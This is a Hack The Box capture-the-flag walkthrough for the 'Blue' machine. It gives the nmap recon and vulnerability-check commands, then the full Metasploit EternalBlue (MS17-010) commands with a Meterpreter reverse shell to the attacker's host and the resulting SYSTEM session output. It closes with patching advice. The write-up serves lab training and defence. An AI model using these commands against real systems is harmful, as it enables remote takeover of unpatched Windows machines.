HTB Blue — EternalBlue (MS17-010) Walkthrough

htbwindowssmbmetasploit

$ 0x01 — Recon

Blue is a Windows 7 box and the single best teacher of “patch your SMB”. Start with a full TCP scan:

nmap -sC -sV -oN blue.nmap 10.10.10.40

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
...

Port 445 with SMBv1 on an unpatched Win7 — that smell is EternalBlue. Confirm it instead of guessing:

nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

$ 0x02 — Exploitation

Fire up Metasploit with the EternalBlue module. Set RHOSTS, a Windows x64 Meterpreter reverse TCP payload, your LHOST — and run:

msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.23
msf6 exploit(ms17_010_eternalblue) > run

[*] 10.10.10.40:445 - Connecting to target...
[+] 10.10.10.40:445 - Connection established...
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.40:49158)

$ 0x03 — Flags

Blue is rated Easy — user.txt sits on a normal user desktop, root.txt needs SYSTEM. EternalBlue lands you as NT AUTHORITY\SYSTEM directly, so both flags fall in one session:

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > search -f user.txt
meterpreter > search -f root.txt

$ 0x04 — Lessons

  • Never skip the vuln-scan scripts. smb-vuln-ms17-010 turns a hunch into a confirmed CVE in seconds.
  • Understand the primitive. MS17-010 is a buffer overflow in SMBv1 transaction handling — the exploit crafts Trans2 requests to get kernel code execution.
  • The real fix is boring: disable SMBv1, patch MS17-010, block 445 at the perimeter. WannaCry wormed the planet through exactly this hole in 2017.
